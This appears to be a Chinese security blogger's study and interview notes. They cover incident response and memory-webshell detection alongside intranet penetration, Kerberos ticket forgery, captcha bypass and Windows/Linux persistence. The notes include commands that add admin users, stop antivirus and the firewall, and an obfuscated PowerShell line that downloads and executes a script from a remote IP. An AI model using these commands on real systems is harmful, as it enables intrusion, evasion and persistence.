<p>注册表:HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM&#x2F;Domains&#x2F;Account&#x2F;Users&#x2F;Names离可以查看</p>
<p>点击“开始”→“运行”，输入“gpedit.msc”运行“组策略”，依次展开“计算机配置”→“Windows 设置”→“安全设置”→“本地策略”→“审核策略”，双击右边的“审核策略更改”，在弹出的设置窗口中勾选“成功”，然后点“确定”。对“审核登陆事件”和“审核过程追踪”进行相同的设置。</p>
<p>隐藏用户,在注册表中删除可以账户</p>
<p>隐藏账户的查找</p>
<h4 id="1-本地用户和组"><a href="#1-本地用户和组" class="headerlink" title="1.本地用户和组"></a>1.本地用户和组</h4><p><img src="/photo/image-20240702094549089.png" alt="image-20240702094549089"></p>
<h4 id="2、注册表"><a href="#2、注册表" class="headerlink" title="2、注册表"></a>2、<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%B3%A8%E5%86%8C%E8%A1%A8&spm=1001.2101.3001.7020">注册表</a></h4><p>WIN + R，输入 <code>regedit</code> ，<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%89%93%E5%BC%80%E6%B3%A8%E5%86%8C%E8%A1%A8&spm=1001.2101.3001.7020">打开注册表</a>，找到下面这个路径，可以看到系统中的所有用户，包括隐藏用户。</p>
<p>\HKEY_LOCAL_MACHINE[SAM]\SAM\Domains\Account\Users\Names</p>
<p>注册表SAM默认没有权限查看，右键【权限】，给administrators勾选完全控制权限，应用并确定，重新打开注册表即可。</p>
<h4 id="三、克隆账号"><a href="#三、克隆账号" class="headerlink" title="三、克隆账号"></a>三、克隆账号</h4><p>创建隐藏用户后，到注册表\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names中，把隐藏用户的F值改成administrator的F值，就可以在不加入管理员组的情况下，拥有管理员权限。</p>
<p>攻击者通常会利用克隆账号的方式留下后门。</p>
<p>排查克隆账号，可以到注册表\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names中，查看是否有隐藏用户（用户名后面是$），如果有，就看这个用户对应的F值和administrator对应的F值是否相同，如果相同，就是克隆账号。</p>
<h2 id="挖矿排查"><a href="#挖矿排查" class="headerlink" title="挖矿排查:"></a>挖矿排查:</h2><p>windows 挖矿排查 ：cpu、内存是否过高、netstat -ano 看pid 、根据pid定位文件名称、重点关注system32 temp等敏感路径</p>
<p>linux 挖矿： top netstat -tlnp 定位pid kill-9 pid 杀进程等</p>
<h2 id="应急实战："><a href="#应急实战：" class="headerlink" title="应急实战："></a>应急实战：</h2><p>挖矿病毒,进程cpu占用99%,对ssh登录进行识别,ssh登录tasklist看不到可疑进程,猜测隐藏了进程，备份文件，进行反弹shell后看到该进程,对该进程进行定位,查看定时任务，查看有误可以账户，,查杀该程序，排查有误其他后门,分析日志,复原攻击链</p>
<p>通过weblogic的cve-2020-14882,14883打进来，天眼检测到webshell，限制webshell路径的权限，断网修复漏洞，查看隐藏账户，发现可疑进程exe，注册表自启动，服务，查杀内存马马aLIEz.jar发现冰蝎内存马，篡改webshell页面利用js获取攻击者信息。利用js获取信息可获取对方ip、系统时间、浏览器各项信息等。</p>
<h2 id="遇到-exe文件如何处理？"><a href="#遇到-exe文件如何处理？" class="headerlink" title="遇到.exe文件如何处理？"></a>遇到.exe文件如何处理？</h2><p>首先看它的来源和去向，然后可以下载但不运行，放入微步沙箱中，看是否有后门，若有后门，就用 IDA 反汇编得到恶意攻击者的有用信息，再进一步描绘出攻击者画像进行溯源</p>
<h2 id="日志、流量分析"><a href="#日志、流量分析" class="headerlink" title="日志、流量分析"></a>日志、流量分析</h2><p>用流量监测的安全设备，比如天眼，查看报文，分析报文里和 host 和网站目录路径，查看是否可疑，使用微步查询 host 是否为恶意，使用 wireshark 对数据包深度分析</p>
<p>看一下请求的网站路径，源 IP 与目的 IP 地址，host 字段的值以及发包内容等</p>
<p>工具有 wireshark，网站的话微步在线等威胁情报中心</p>
<h1 id="内存马查杀工具"><a href="#内存马查杀工具" class="headerlink" title="内存马查杀工具"></a>内存马查杀工具</h1><p>排查:如果我们通过检测工具或者其他手段发现了一些内存webshell的痕迹，需要有一个排查的思路来进行跟踪分析，也是根据各类型的原理，列出一个排查思路。</p>
<blockquote>
<p>先判断是通过什么方法注入的内存马，可以先查看web日志是否有可疑的web访问日志，如果是filter或者listener类型就会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的，查看是否有类似哥斯拉、冰蝎相同的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</p>
<p>如果是jsp注入，日志中排查可疑jsp的访问请求。<br>如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法<br>根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。<br>如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。<br>如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</p>
</blockquote>
<p>目标：访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令执行结果</p>
<p>实现：以java为例，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。</p>
<h2 id="FindShell"><a href="#FindShell" class="headerlink" title="FindShell"></a><strong><a target="_blank" rel="noopener" href="https://github.com/4ra1n/FindShell">FindShell</a></strong></h2><p>这是一个自动的内存马查杀工具，可以用于普通内存马和<code>Java Agent</code>内存马</p>
<p>尤其针对难以查杀的<code>Java Agent</code>型内存马，例如冰蝎等主流工具的内存马都是<code>Java Agent</code></p>
<p>主要分为以下四步：</p>
<ul>
<li>利用<code>JDK</code>提供的<code>sa-jdi</code>的<code>API</code>基于黑名单<code>dump</code>存在于<code>JVM</code>中<strong>真正的</strong>字节码</li>
<li>这种字节码在很多情况下是非法的，所以我修改了<code>ASM</code>源码以分析非法字节码</li>
<li>基于<code>ASM</code>做普通的分析和模拟栈帧做深入的分析</li>
<li>如果发现内存马将会尝试自动修复目标（利用<code>Java Agent</code>动态恢复原始字节码）</li>
</ul>
<p>用法:</p>
<p>Jps</p>
<p>java -jar FindShell.jar –pid [目标JVM的PID]</p>
<h2 id="java-memshell-scanner"><a href="#java-memshell-scanner" class="headerlink" title="java-memshell-scanner"></a><a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner</a></h2><p>通过jsp扫描应用中所有的filter和servlet，然后通过名称、对应的class是否存在来判断是否是内存马</p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集:"></a>信息收集:</h2><ol>
<li>探测内网环境（ip及端口)</li>
<li>获取浏览器等保存的密码信息</li>
<li>查找本地存储的rdp等密码信息或者尝试登录</li>
<li>翻看本地数据库以及相关文件获取信息</li>
</ol>
<p>net user &#x2F;domain                                           获取域用户列表 </p>
<p>net group “domain admins” &#x2F;domain             获取域管理员列表<br>​                    </p>
<p>net group “domain controllers” &#x2F;domain        查看域控制器(如果有多台)<br>​                    </p>
<p>net group “domain computers” &#x2F;domain        查看域机器<br>​                    </p>
<p>net group &#x2F;domain                                         查询域里面的组<br>​                    </p>
<p>net view                                                         查看同一域内机器列表<br>​                    </p>
<p>net view \ip                                                    查看某IP共享<br>​                    </p>
<p>net view \GHQ                                               查看GHQ计算机的共享资源列表<br>​                    </p>
<p>net view &#x2F;domain                                           查看内网存在多少个域<br>​net view &#x2F;domain:XYZ                                   查看XYZ域中的机器列表<br>​                    </p>
<p>net accounts &#x2F;domain                                    查看域密码策略<br>​                    </p>
<p>wmic qfe                                                        查看补丁信息</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看补丁信息</p>
<p>MySQL UDP提权</p>
<p>bypass UAC</p>
<p>烂土豆</p>
<p>脏牛提权</p>
<p>sudo提权</p>
<p>计划任务</p>
<h2 id="内网搭建隧道"><a href="#内网搭建隧道" class="headerlink" title="内网搭建隧道:"></a>内网搭建隧道:</h2><p>拿到服务器权限之后，遇见这种机器，十分简单，针对不同情况搭建不同隧道，为了速度可以建立sockets隧道、为了隐蔽可以使用dns隧道、icmp隧道等</p>
<p>frp</p>
<p>dns</p>
<p>icmp</p>
<p>lcx</p>
<p>ew</p>
<h2 id="内网主机不出网"><a href="#内网主机不出网" class="headerlink" title="内网主机不出网:"></a>内网主机不出网:</h2><p>拿到服务器权限之后，遇见这种机器，只能利用基于webshell的代理，只需要将webshell上传到目标主机即可，然后建立tcp连接，主要利用session来识别不同的的tcp连接，我们攻击监听tcp，将数据post提交到webshell即可进行传输</p>
<p>Neo-reGeorg</p>
<p>pystinger</p>
<p>不出网机器上线一般有以下几种方式：</p>
<ul>
<li>使用smb beacon</li>
<li>配置listener通过HTTP代理上线</li>
<li>使用pystinger搭建socks4代理</li>
</ul>
<p>这几种方式之前有师傅也在先知写过《不出网主机上线方法》。此处我采用的SMB beacon这个方法。</p>
<p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。</p>
<p>首先得到内网中一台主机的beacon，抓取密码后进行smb喷射，得到另一台开放445端口的机器上的administrator账户密码，在目标机器不出网的情况下，可以使用Smb beacon使目标主机上线</p>
<p><strong>使用条件</strong></p>
<ul>
<li>具有 SMB Beacon 的主机必须接受 445 端口上的连接。</li>
<li>只能链接由同一个 Cobalt Strike 实例管理的 Beacon。</li>
<li>利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。</li>
</ul>
<h2 id="金银票据"><a href="#金银票据" class="headerlink" title="金银票据:"></a>金银票据:</h2><p><strong>黄金票据:</strong></p>
<p>特点:不需要与AS进行交互，需要用户krb tgt的Hash</p>
<p>一、伪造凭据，提升域内普通用户的权限</p>
<p>二、伪造金票的所需条件<br> 1、域名称<br> 2、域的SID值<br> 3、域的KRBTGT账号的HASH<br> 4、伪造任意用户名</p>
<p>三、金票的使用(普通域账户，利用黄金票据，创建域管账户)</p>
<p><strong>白银票据:</strong></p>
<p>特点:不需要与KDC进行交互   2.需要server的NTLM hash</p>
<p>一、伪造凭据，提升域内普通用户的权限</p>
<p>二、伪造银票</p>
<p><strong>金票和银票的区别:</strong></p>
<p><strong>获取的权限不同</strong></p>
<p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br> 银票：伪造的ST，只能访问指定的服务，如CIFS</p>
<p><strong>认证流程不同</strong></p>
<p>金票：同KDC交互，但不同AS交互<br> 银票：不同KDC交互，直接访问Server</p>
<p><strong>加密方式不同</strong></p>
<p>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密</p>
<h2 id="dos命令"><a href="#dos命令" class="headerlink" title="dos命令:"></a>dos命令:</h2><p>查看版本：ver </p>
<p>查看权限：whoami </p>
<p>查看配置：systeminfo </p>
<p>查看用户：net user </p>
<p>查看进程：tasklist </p>
<p>查看正在运行的服务：tasklist &#x2F;svc </p>
<p>查看开放的所有端口：netstat -ano </p>
<p>查询管理用户名：query user </p>
<p>查看搭建环境：ftp 127.0.0.1<br>查</p>
<p>看指定服务的路径：sc qc Mysql </p>
<p>添加一个用户：net user jianmei daxia.asd &#x2F;add </p>
<p>提升到管理权限：net localgroup administrators jianmei &#x2F;add </p>
<p>添加用户并提升权限：net user jianmei daxia.asd &#x2F;add &amp; net localgroup administrators jianmei &#x2F;add </p>
<p>查看制定用户信息：net user jianmei </p>
<p>查看所有管理权限的用户：net localgroup administrators </p>
<p>加入远程桌面用户组：net localgroup “Remote Desktop Users” jianmei &#x2F;add </p>
<p>突破最大连接数：mstsc &#x2F;admin &#x2F;v:127.0.0.1<br>删除用户：net user jianmei &#x2F;del<br>删</p>
<p>除管理员账户:net user administrator daxia.asd </p>
<p>更改系统登陆密码：net password daxia.asd </p>
<p>激活GUEST用户：net user guest &#x2F;active:yes </p>
<p>开启TELNET服务：net start telnet </p>
<p>关闭麦咖啡：net stop “McAfee McShield” </p>
<p>关闭防火墙：net stop sharedaccess </p>
<p>查看当前目录的所有文件：dir c:\windows\ </p>
<p>查看制定文件的内容：type c:\windows\1.asp<br>把cmd.exe复制到c:\windows的temp目录下并命名为cmd.txt：copy c:\windows\system32\cmd.exe c:\windows\temp\cmd.txt<br>开3389端口的命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<br>查看补丁：dir c:\windows&gt;a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find &#x2F;i “%i”||@echo %i Not Installed!)&amp;del &#x2F;f &#x2F;q &#x2F;a a.txt </p>
<h1 id="Bypass-AV"><a href="#Bypass-AV" class="headerlink" title="Bypass AV"></a>Bypass AV</h1><h2 id="powershell行为免杀"><a href="#powershell行为免杀" class="headerlink" title="powershell行为免杀"></a>powershell行为免杀</h2><p>powershell.exe -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal  -w   Normal -w Minimized   set-alias -name key -value IEX; key(New-Object Net.WebClient).DownloadString(‘ht’+‘tp:&#x2F;&#x2F;121.196.150.68&#x2F;1.ps1’)</p>
<h2 id="EXE异或免杀"><a href="#EXE异或免杀" class="headerlink" title="EXE异或免杀"></a>EXE异或免杀</h2><h2 id="内存加载"><a href="#内存加载" class="headerlink" title="内存加载"></a>内存加载</h2><h2 id="rsa加密内存解密"><a href="#rsa加密内存解密" class="headerlink" title="rsa加密内存解密"></a>rsa加密内存解密</h2><h1 id="TCP-IP模型"><a href="#TCP-IP模型" class="headerlink" title="TCP&#x2F;IP模型"></a>TCP&#x2F;IP模型</h1><p><img src="/photo/70.jpeg" alt="img"></p>
<h1 id="OSI七层网络模型"><a href="#OSI七层网络模型" class="headerlink" title="OSI七层网络模型"></a>OSI七层网络模型</h1><p>应用层：文件传输，电子邮件，文件服务，虚拟终端 TFTP，HTTP，SNMP，FTP，SMTP，DNS，Telnet</p>
<p>表示层：数据格式化，代码转换，数据<a target="_blank" rel="noopener" href="https://www.2cto.com/article/jiami/">加密</a> 没有协议</p>
<p>会话层：解除或建立与别的接点的联系 没有协议</p>
<p>传输层：提供端对端的接口 TCP，UDP</p>
<p>网络层：为数据包选择路由 IP，ICMP，RIP，OSPF，BGP，IGMP</p>
<p>数据链路层：传输有地址的帧以及错误检测功能 SLIP，CSLIP，PPP，ARP，RARP，MTU</p>
<p>物理层：以二进制数据形式在物理媒体上传输数据 ISO2110，IEEE802，IEEE802.2</p>
<h1 id="面试经验"><a href="#面试经验" class="headerlink" title="面试经验"></a>面试经验</h1><h2 id="sqlmap操作"><a href="#sqlmap操作" class="headerlink" title="sqlmap操作"></a>sqlmap操作</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dzqxwzoe/article/details/132683722">https://blog.csdn.net/dzqxwzoe/article/details/132683722</a></p>
<p><img src="/photo/sqlmap%E5%8F%82%E6%95%B0.png" alt="sqlmap参数"></p>
<p>一、目标<br>1、指定url<br>2、指定文件（批量检测）<br>3、指定数据库&#x2F;表&#x2F;字段<br>4、post请求<br>5、cookie注入<br>二、脱库<br>1、获取数据库<br>2、获取表<br>3、获取字段<br>4、获取字段类型<br>5、获取值（数据）<br>6、获取用户<br>7、获取主机名<br>8、搜索库、表、字段。<br>9、正在执行的SQL语句<br>三、WAF绕过<br>三、其他<br>level和risk的区别：</p>
<p>level级别越高发送的请求越多，并且在level3以上时会尝试对referer注入。</p>
<p>而risk则是风险系数，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会 增加OR语句的QL注入测试。在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句， 可能导致更新的整个表，可能造成很大的风险<br><img src="/photo/image-20240609230450260.png" alt="image-20240609230450260"></p>
<p><img src="/photo/image-20240609230511825.png" alt="image-20240609230511825"></p>
<h2 id="验证码可能存在的缺陷"><a href="#验证码可能存在的缺陷" class="headerlink" title="验证码可能存在的缺陷"></a>验证码可能存在的缺陷</h2><p>1.图文识别过于简单，可以被工具识别</p>
<p>2.验证码空值绕过，后台登陆请求：submit&#x3D;%E6%8F%90%E4%BA%A4&amp;username&#x3D;admin&amp;password&#x3D;admin123§156§&amp;expire&#x3D;&amp;<strong>verify&#x3D;7v111e7</strong>&amp;submit&#x3D;+%E7%99%BB+%E9%99%86+<br>通过清空此处的验证码字段，服务端就不会验证验证码了，就可以继续进行常规的暴力破解。</p>
<p>3.验证码可控</p>
<p>在这里登录的过程中，会先发送含有明文验证码的数据包，因此可以直接利用。</p>
<p>有时候会对报文的内容进行编码（弱加密）处理，也可视为明文。</p>
<p>这个报文是通过结合时间戳的方式构造验证码，通常为时间戳的后4-6位。但是不局限于时间戳，可能为数据包的其他参数。</p>
<p>攻击方法，截取登录时全部的数据包，查找是否有验证码信息的违规泄露。如果存在就可以通过创建脚本，从而来结合泄露验证码的位置，再进行暴力破解。</p>
<p>4.验证码存在规律</p>
<p>例如5次后重复，或是等差数列等一系列可以直接预测到的验证码。</p>
<p>5.验证码爆破</p>
<p>此处可以直接遍历，以此爆破验证码。这个案例中需要注意的是，此漏洞利用难度较大，风险等级为低危。</p>
<p>具有一定局限性，仅仅适用验证码在成功后会销毁，但是验证码错误的情况下不会销毁。</p>
<p>但是有种情况可以直接利用，就是当短信验证码的服务端未对验证时间、次数进行限制的时候，并且验证码为<strong>4-6****位数字</strong>组成，则存在被爆破的可能。</p>
<p>6.验证码复用</p>
<p>这是验证码安全里最常见的一类安全问题，也是最容易遗漏的一类。</p>
<p>一般来说，验证码是与Session绑定的，Session生成时，往往也伴随着验证码的生成和绑定。</p>
<p>在访问页面时，接口的请求和验证码的生成通常是异步进行的，这使得两个功能变得相对独立。也就意味着我们如果仅请求接口，而不触发验证码的生成，那么验证码就不会变化。</p>
<p>并且在考虑安全时，开发人员的关注点往往在 验证码校验 是否通过，通过则进入业务流程，不通过则重新填写，而忽视了 这个用户是否按照既定的业务流程在走（接口访问与验证码生成是否同时进行），验证码是否被多次使用了。观察验证码是否会变化，如果不变化可以直接进行爆破。</p>
<p>当这类漏洞出现在注册界面&#x2F;忘记密码的时候，可以通过使用这类漏洞构成新的漏洞-用户枚举，从而获取到账号本。</p>
<p>7.状态码绕过</p>
<p>这里将响应码修改至200，就可以直接绕过限制，获取验证码或者登录后台。验证逻辑存在问题，只识别了响应码，响应包不局限于将500改为200&#x2F;000，还包括将error改为ok等。实际操作中建议查看js源码，查看响应码逻辑。</p>
<p>8.加密报文绕过</p>
<p>这里可以看到此处的验证码字段已经被加密，但是此处是验证码功能设计缺陷，导致直接使用明文就同样可以通过验证。这种漏洞利用难度很大，很难直接通过这种漏洞进行暴力破解，属于验证码的功能缺陷类型的漏洞，漏洞定级为低危。</p>
<h2 id="互联网面的暴露面梳理"><a href="#互联网面的暴露面梳理" class="headerlink" title="互联网面的暴露面梳理"></a>互联网面的暴露面梳理</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Liyu_6618/article/details/136092503">https://blog.csdn.net/Liyu_6618/article/details/136092503</a></p>
<p>1.暴露在互联网上的 IP 资产、域名资产等。</p>
<p><img src="/photo/image-20240609232015470.png" alt="image-20240609232015470"></p>
<p>2.暴露的资产中存在一部分未知的资产。（重点整理边缘资产）</p>
<p>3.在互联网上可能会泄露的敏感信息，包括但不限:企业邮箱账号，个人邮箱账号，个人身份信息等。</p>
<p>4.主要业务系统的代码泄露在公开的代码平台，甚至暴露了重要数据和用户名及密码以及个人信息，包括。</p>
<p>5.对互联网提供访问的服务器可能开启了高危端口。</p>
<p>6.对互联网提供访问的服务器中会存在未修复高危漏洞风险。</p>
<p>7.对互联网提供访问的服务器有暴露的后台登录页面等。<br><img src="/photo/image-20240609232050414.png" alt="image-20240609232050414"></p>
<h3 id="自动化查杀"><a href="#自动化查杀" class="headerlink" title="自动化查杀"></a>自动化查杀</h3><ul>
<li>病毒查杀<ul>
<li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li>
</ul>
</li>
<li>webshell查杀<ul>
<li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li>
</ul>
</li>
</ul>
<p>日志分析<br>系统日志</p>
<p>分析方法：</p>
<p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
<p>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开”事件查看器”。</p>
<p>C、导出应用程序日志、安全日志、系统日志，利用 Log Parser 进行分析。</p>
<p>Web 访问日志</p>
<p>分析方法：</p>
<p>a、找到中间件的web日志，打包到本地方便进行分析。</p>
<p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p>
<h2 id="攻击dmz区是什么原因"><a href="#攻击dmz区是什么原因" class="headerlink" title="攻击dmz区是什么原因"></a>攻击dmz区是什么原因</h2><p>不能直接攻击内网，因此用dmz区当跳板，搭隧道去访问内网</p>
<p>像dns隧道技术有dnscat2</p>
<p>dmz区是隔离区，与军事区和信任区相对应，也称“非军事化区”，是为了解决外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。作用是把单位的 FTP服务器、E-Mail服务器等允许外部访问的服务器单独部署在此区域，使整个需要保护的内部网络接在信任区后，不允许任何外部网络的直接访问，实现内外网分离，满足用户的安全需求。</p>
<p>攻击 DMZ (Demilitarized Zone) 区域的基本原理是利用 DMZ 区域和内部网络之间的相对隔离性,以及 DMZ 区域内可能存在的安全漏洞,来获取对内部网络的访问权限。</p>
<p>DMZ 区域的基本原理如下:</p>
<ol>
<li>隔离内外网络:<ul>
<li>DMZ 区域位于防火墙的外部网络和内部网络之间,起到了缓冲和隔离的作用。</li>
<li>DMZ 区域中的服务器可以被外部网络访问,但不能直接访问内部网络。</li>
</ul>
</li>
<li>暴露服务器:<ul>
<li>DMZ 区域通常会放置一些需要被外部访问的服务器,如 Web 服务器、邮件服务器等。</li>
<li>这些服务器被置于 DMZ 区域,以保护内部网络的安全。</li>
</ul>
</li>
<li>安全漏洞:<ul>
<li>DMZ 区域的服务器可能存在一些安全漏洞,如软件漏洞、配置错误等。</li>
<li>攻击者可以利用这些漏洞,先渗透 DMZ 区域的服务器,然后尝试进一步渗透到内部网络。</li>
</ul>
</li>
</ol>
<h2 id="windows权限维持"><a href="#windows权限维持" class="headerlink" title="windows权限维持"></a>windows权限维持</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxin07/p/18103371">https://www.cnblogs.com/xiaoxin07/p/18103371</a></p>
<p><img src="/photo/image-20240609235223046.png" alt="image-20240609235223046"></p>
<p>当我们<strong>未登陆系统</strong>(停留在登陆界面)的时候 系统还不知道我们将以哪个用户登陆,所以在这个时候连续按5次shift后的话<strong>系统将会以system用户(具有管理员级别的权限)来运行sethc.exe这个程序</strong></p>
<p><img src="/photo/image-20240609235233673.png" alt="image-20240609235233673"></p>
<p><img src="/photo/image-20240609235242808.png" alt="image-20240609235242808"></p>
<p><img src="/photo/image-20240609235249339.png" alt="image-20240609235249339"></p>
<p><img src="/photo/image-20240609235255972.png" alt="image-20240609235255972"></p>
<p><img src="/photo/image-20240609235307792.png" alt="image-20240609235307792"></p>
<p><img src="/photo/image-20240609235316575.png" alt="image-20240609235316575"></p>
<p><img src="/photo/image-20240609235324465.png" alt="image-20240609235324465"></p>
<p><img src="/photo/image-20240609235332982.png" alt="image-20240609235332982"></p>
<p><img src="/photo/image-20240609235345442.png" alt="image-20240609235345442"></p>
<p>可以看到双击txt文件直接就打开了cmd，如果是木马文件就会直接执行了，并反弹权限，达到权限维持的目的</p>
<h2 id="linux权限维持"><a href="#linux权限维持" class="headerlink" title="linux权限维持"></a>linux权限维持</h2><h3 id="1-木马隐藏"><a href="#1-木马隐藏" class="headerlink" title="1.木马隐藏"></a>1.木马隐藏</h3><h4 id="a、修改时间"><a href="#a、修改时间" class="headerlink" title="a、修改时间"></a>a、修改时间</h4><p>利用<code>touch -r </code>修改时间</p>
<h4 id="b、隐藏文件名"><a href="#b、隐藏文件名" class="headerlink" title="b、隐藏文件名"></a>b、隐藏文件名</h4><p>创建文件时名字前面加.<br>而隐藏文件单纯使用**<em>ls*<strong>是无法查看的，需要使用</strong></em>ls -la***才能查看到，如下</p>
<h4 id="c、删除权限"><a href="#c、删除权限" class="headerlink" title="c、删除权限"></a>c、删除权限</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chattr +i test.txt`</span><br><span class="line">`chattr -i test.txt</span><br></pre></td></tr></table></figure>

<img src="photo/image-20240610000000145.png" alt="image-20240610000000145" style="zoom:50%;" />

<h4 id="d、隐藏历史记录"><a href="#d、隐藏历史记录" class="headerlink" title="d、隐藏历史记录"></a>d、隐藏历史记录</h4><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p>
<p><img src="/photo/image-20240610000029349.png" alt="image-20240610000029349"></p>
<h4 id="e、隐藏ssh连接"><a href="#e、隐藏ssh连接" class="headerlink" title="e、隐藏ssh连接"></a>e、隐藏ssh连接</h4><p><img src="/photo/image-20240610000122750.png" alt="image-20240610000122750"></p>
<h3 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h3><p><img src="/photo/image-20240610000157279.png" alt="image-20240610000157279"></p>
<h3 id="3-suid-shell"><a href="#3-suid-shell" class="headerlink" title="3.suid shell"></a>3.suid shell</h3><p><img src="/photo/image-20240610000218517.png" alt="image-20240610000218517"></p>
<h3 id="4-SSH软连接"><a href="#4-SSH软连接" class="headerlink" title="4.SSH软连接"></a>4.SSH软连接</h3><p><img src="/photo/image-20240610000240030.png" alt="image-20240610000240030"></p>
<h3 id="5-ssh公私钥免密登录"><a href="#5-ssh公私钥免密登录" class="headerlink" title="5.ssh公私钥免密登录"></a>5.ssh公私钥免密登录</h3><p>本地生成公私钥<code>ssh-keygen -t rsa</code>，进入&#x2F;root&#x2F;.ssh&#x2F;文件夹，查看文件夹的内容，如下所示：其中 id_rsa为私钥，id_rsa.pub为公钥，接下来打开id_rsa.pub，将内容复制到服务器。将id_rsa.pub的内容追加到&#x2F;root&#x2F;.ssh&#x2F;authorized_keys内，配置完成。</p>
<p><img src="/photo/image-20240610000328550.png" alt="image-20240610000328550"></p>
<h2 id="命令执行无回显流量"><a href="#命令执行无回显流量" class="headerlink" title="命令执行无回显流量"></a>命令执行无回显流量</h2><p>判断：</p>
<p><strong>延时判断</strong></p>
<p>首先我们需要知道该点是否存在命令执行漏洞，或者我们的命令是否执行成功了。这里的研判方法有很多种，最常用的是直接通过延时判断，类似我们sql注入里的时间盲注：cmd&#x3D;sleep 5</p>
<p><img src="/photo/image-20240610001614331.png" alt="image-20240610001614331"></p>
<p>Linux下同样试用，我们还可以通过ping命令在不同环境下的执行方式来判断目标的操作系统类型：</p>
<p>ping -c 3 127.0.0.1</p>
<p>ping -c 4 127.0.0.1</p>
<p><strong>流量监听</strong></p>
<p>流量监听是渗透攻击者另一个常用的命令执行判断和利用方式，流量监听最重要的一个条件是目标系统必须能出网。</p>
<p>这里想先跟大家讨论下“出网”这一概念，我们所谓出不出网其实是要分不同环境和不同场景的。主要还是看防火墙和其他安全设备的配置策略，有全流量不出网、指定端口不出网、指定协议流量不出网等等。有的小伙伴在渗透时经常遇到明明dnslog能收到请求但是却无法通过nps等工具建立隧道的场景。抛开被监控软件拦截，最有可能的原因就是用户环境指定了tcp流量不出网。我们知道dns是应用层的协议，通常是基于udp的（部分极端情况也可使用tcp），因此dnslog能收到请求并不代表全流量都能出网。这种情况下我们就需要想办法建立一些其他协议的通信隧道，如dns隧道、icmp隧道等。</p>
<p>出网的情况下想要验证命令是否执行成功方法就太多了，我们可以用dnslog、httplog等进行漏洞验证，也可以直接建立反向代理隧道进行漏洞利用。在漏洞验证时推荐可以使用burp的Collaborator<br>Client功能。这是一个类似httpslog+dnslog的插件，其功能要比dnslog强大，我们可以不用搭建任何环境就能监听dns和http请求，也可以很方便的查看post请求包和cookie等。Collaborator<br>Client的使用方法如图：</p>
